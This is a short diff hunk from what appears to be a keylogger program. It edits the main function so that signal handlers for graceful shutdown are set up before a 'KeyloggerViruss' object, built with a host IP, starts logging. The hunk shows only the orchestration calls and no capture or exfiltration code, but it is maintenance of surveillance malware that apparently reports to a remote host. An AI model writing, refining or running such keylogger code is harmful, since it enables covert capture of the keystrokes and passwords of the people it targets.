@@ -138,14 +138,14 @@ def main():
         print("Error: No write access")
         return
 
-    # 3. Run keylogger
     keylogger = KeyloggerViruss(host=IP)
-    keylogger.run_keylogger()
-
-    # 4. Setup signal handlers for graceful shutdown
+    # 3. Setup signal handlers for graceful shutdown
     signal_handler = create_signal_handler(keylogger)
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
+
+    # 4. Run keylogger
+    keylogger.run_keylogger()
 
 if __name__ == "__main__":
     main()
